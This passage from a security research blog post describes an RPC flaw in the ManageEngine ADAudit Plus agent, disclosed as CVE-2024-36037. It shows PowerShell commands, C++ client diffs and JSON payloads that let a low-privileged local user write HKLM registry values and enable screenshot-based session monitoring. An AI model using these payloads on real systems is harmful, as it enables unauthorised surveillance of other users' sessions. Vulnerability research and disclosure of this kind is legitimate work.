&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Rebuild the solution and the execute the binary and check the logs. Boom.
We are in the &lt;code&gt;NotifyAgentStr&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; Get-Content &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\Logs\MessengerLog_2023_12_01.txt&amp;#39;&lt;/span&gt; -Tail &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;01&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;03&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;834&lt;/span&gt;] [&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;][&lt;span style=&#34;color:#66d9ef&#34;&gt;INFO ][Messenger&lt;/span&gt;] &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; NATV.FA_NotifyAgentStr :: notification from ADAP server, notifyId &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;01&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;03&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;849&lt;/span&gt;] [&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;][&lt;span style=&#34;color:#66d9ef&#34;&gt;ERROR][Messenger&lt;/span&gt;] &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; EXCEPTION :: RPCHandler.NotifyAgentStr &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; Newtonsoft.Json.JsonReaderException&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; Unexpected character encountered &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; parsing value&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; s. Path &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;position&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   at Newtonsoft.Json.JsonTextReader.ParseValue()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   at Newtonsoft.Json.JsonTextReader.Read()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.ReadForType(JsonReader reader, JsonContract contract, Boolean hasConverter)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.Deserialize(JsonReader reader, Type objectType, Boolean checkAdditionalContent)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   at Newtonsoft.Json.JsonSerializer.DeserializeInternal(JsonReader reader, Type objectType)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   at Newtonsoft.Json.JsonConvert.DeserializeObject(String value, Type type, JsonSerializerSettings settings)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   at Newtonsoft.Json.JsonConvert.DeserializeObject[&lt;span style=&#34;color:#66d9ef&#34;&gt;T&lt;/span&gt;](String value, JsonSerializerSettings settings)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   at Agent.RPC.RPCHandler.NotifyAgentStr(Int32 notifyId, String msgStr) &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; d:\Webhost\&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;2021&lt;/span&gt;\WindowsBuilds\ADAUDITPLUS_GIT\&lt;span style=&#34;color:#ae81ff&#34;&gt;4649300&lt;/span&gt;\ftpagent64\ADAP_SRC\source\agent\core\ADAPAgent\ADAPAgent\RPC\RPCHandler.cs&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;line &lt;span style=&#34;color:#ae81ff&#34;&gt;118&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The result is a JSON parsing error meaning that the agent is probably expecting
JSON input. What we also notice from the agent code is that we have an if statement
(line 2) that compares a JSON key named &lt;code&gt;AgentUID&lt;/code&gt; with a value fetched by &lt;code&gt;DataStore.Get()&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hashtable msgMap = JsonAPI.JsonToHashtable(msgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (msgMap.ContainsKey(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AgentUID&amp;#34;&lt;/span&gt;) &amp;amp;&amp;amp; DataStore.Get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AgentUID&amp;#34;&lt;/span&gt;).ToString().Equals(msgMap[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AgentUID&amp;#34;&lt;/span&gt;].ToString()))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			errStatus = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			JObject json = JObject.Parse(msgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			json.Remove(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AgentUID&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			json.Remove(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ADAP_SERVER_DNS_NAME&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; jsonMsgStr = JsonAPI.ObjectToJsonString(json);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (notifyId)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				DataStore.Update(jsonMsgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[...]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;DataStore.Get()&lt;/code&gt; seems to fetch data from the Windows Registry:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;adauditagent-datastore-registry.png&#34; alt=&#34;adauditagent-datastore-registry&#34;&gt;&lt;/p&gt;
&lt;p&gt;At this location in the Windows registry the &lt;code&gt;AgentUID&lt;/code&gt; is stored:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;agentuid-fetched-from-windows-registry.png&#34; alt=&#34;agentuid-fetched-from-windows-registry&#34;&gt;&lt;/p&gt;
&lt;p&gt;What this information tells us is that we cannot successfully communicate with the
ADAudit Agent over the network as we do not know the &lt;code&gt;AgentUID&lt;/code&gt;. If we fail to match the &lt;code&gt;AgentUID&lt;/code&gt;
we fall into to else statement which skips over all the fun cases:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			Logger.Msgr.ErrorFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;synced from unknown server : ServerName :: {0}&amp;#34;&lt;/span&gt;, msgMap[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ADAP_SERVER_DNS_NAME&amp;#34;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, we are allowed to read
registry item from a low-privileged session on the machine, meaning that we still
can turn this &lt;em&gt;something&lt;/em&gt; that we have into a local attack.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; (Get-ItemProperty -Path &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HKLM:\SOFTWARE\ManageEngine\ADAP&amp;#34;&lt;/span&gt; -Name AgentUID).AgentUID
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1699964702085&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lets see if &lt;code&gt;case 0:&lt;/code&gt; is reachable if a correct &lt;code&gt;AgentUID&lt;/code&gt; is provided:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-    long arg_0 = 0;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-    wchar_t arg_1[] = L&amp;#34;snus&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-    long arg2_pointer;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+    long arg_0 = 0;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+    wchar_t arg_1[] = L&amp;#34;{\&amp;#34;AgentUID\&amp;#34;:\&amp;#34;1699964702085\&amp;#34;,\&amp;#34;snus\&amp;#34;:\&amp;#34;true\&amp;#34;}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+    long arg2_pointer;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Build, execute, check the logs:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; Get-Content &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\Logs\MessengerLog_2023_12_01.txt&amp;#39;&lt;/span&gt; -Tail &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;][&lt;span style=&#34;color:#66d9ef&#34;&gt;INFO ][Messenger&lt;/span&gt;] &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; NATV.FA_NotifyAgentStr :: notification from ADAP server, notifyId &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Look successful. But what happened? Search through all logs..&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; Get-ChildItem &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\Logs\*&amp;#39;&lt;/span&gt; | Select-String snus
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AgentLog_2023_12_01.txt&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;01&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;884&lt;/span&gt;] [&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;][&lt;span style=&#34;color:#66d9ef&#34;&gt;INFO ][Default&lt;/span&gt;] &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; Set Registry Key&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; HKEY_LOCAL_MACHINE\SOFTWARE\ManageEngine\ADAP\snus = true
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we are getting somewhere. We have the ability to write arbitrary registry
entries in the &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\ManageEngine\ADAP&lt;/code&gt; location which
should only be writable by high-privileged users. And we can do this
from a local low-privileged user. Very nice.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;arbitrary-registry-changes.png&#34; alt=&#34;arbitrary-registry-changes&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;insert celebration dance and get more coffee&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Create a valid IDL structure&lt;/li&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Brew a large can of coffee&lt;/li&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Build a RPC client&lt;/li&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Guess a lot&lt;/li&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Create input data that will be marshalled into a valid stub that server will act on.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The last step is now completed on the initial to do-list. But more reversing
is needed to reach our en goal. Remember the &lt;code&gt;SessionMonitoring&lt;/code&gt; feature which
was the targetted functionality?&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SessionMonitoring&lt;/code&gt; seems to be enabled by the registry item &lt;code&gt;SMStatus&lt;/code&gt; in
&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\ManageEngine\ADAP\SessionMonitoring&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;registry-showing-how-to-enable-sessionmonitoring.png&#34; alt=&#34;registry-showing-how-to-enable-sessionmonitoring&#34;&gt;&lt;/p&gt;
&lt;p&gt;By reviewing the decompiled code of the &lt;code&gt;ADAPAgent.exe&lt;/code&gt; function &lt;code&gt;DataStore&lt;/code&gt;
we notice that if we input &lt;code&gt;SMData&lt;/code&gt; as a JSON key we can reach
&lt;code&gt;DataStore.UpdateSMDetails&lt;/code&gt; which looks promising.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dotnet-sourcecode-showing-howto-reach-smdata.png&#34; alt=&#34;dotnet-sourcecode-showing-howto-reach-smdata&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dotnet-code-showing-how-to-enable-sessionmonitoring.png&#34; alt=&#34;dotnet-code-showing-how-to-enable-sessionmonitoring&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s update our custom ADAuditAgentRPC client POC with a nested JSON object
such as:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;AgentUID&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1699964702085&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;SMData&amp;#34;&lt;/span&gt;:{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;SMStatus&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;True&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-  wchar_t arg_1[] = L&amp;#34;{\&amp;#34;AgentUID\&amp;#34;:\&amp;#34;1699964702085\&amp;#34;,\&amp;#34;snus\&amp;#34;:\&amp;#34;true\&amp;#34;}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+  wchar_t arg_1[] = L&amp;#34;{\&amp;#34;AgentUID\&amp;#34;:\&amp;#34;1699964702085\&amp;#34;,\&amp;#34;SMData\&amp;#34;:{\&amp;#34;SMStatus\&amp;#34;:\&amp;#34;True\&amp;#34;}}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Build, execute, check the logs:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; Get-Content &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\Logs\AgentLog_2023_12_02.txt&amp;#39;&lt;/span&gt; | Select-String SMSTatus
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;02&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;988&lt;/span&gt;] [&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;][&lt;span style=&#34;color:#66d9ef&#34;&gt;INFO ][Default&lt;/span&gt;] &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; Set Registry Key&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; HKEY_LOCAL_MACHINE\SOFTWARE\ManageEngine\ADAP\SessionMonitoring\SMStatus = True
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Great success!&lt;/p&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;So what we actually managed to do is to enable the SessionMonitoring feature from a local
low privileged user. When this feature is enabled and when a user logs
into the machine screenshots will be taken
with 1 seconds interval and stored in the directory &lt;code&gt;C:\ProgramData\ManageEngine\ADAuditPlus Agent\SessionMonitoring&lt;/code&gt;. This directory is readable by all local users and enables an attacker
to monitor other sessions.&lt;/p&gt;
&lt;p&gt;In addition all configuration parameter stored in the registry at
&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\ManageEngine\ADAP&lt;/code&gt; is under the attackers control.&lt;/p&gt;
&lt;p&gt;POC:&lt;/p&gt;

    

&lt;video width=100% controls autoplay&gt;
    &lt;source src=&#34;https://www.shelltrail.com/video/adauditpoc.webm&#34; type=&#34;video/webm&#34;&gt;
    Your browser does not support the video tag.
&lt;/video&gt;



&lt;p&gt;The permissive folder permission allowing all users to view the screenshots
was assigned &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-36037&#34;&gt;CVE-2024-36037&lt;/a&gt; and was fixed in &lt;a href=&#34;https://www.manageengine.com/products/active-directory-audit/adaudit-plus-release-notes.html&#34;&gt;Build 7270 (Dec 29, 2023)&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Fixes&lt;/p&gt;
&lt;p&gt;A few changes focused on hardening the security of agent data have been implemented.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;However, one crucial part regarding the ADAudit Agent RPC client was overseen. Remember the first sentence in part 1:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;&lt;em&gt;The objective when this research started was actually to find a new way to leverage an old CVE&lt;/em&gt;&amp;rdquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;hellip; We are not using the latest version.&lt;/p&gt;
&lt;p&gt;Continue reading part 3 to find out which mitigation that was already in place,
preventing exploitation of the RPC security issue, and how it was bypassed.&lt;/p&gt;
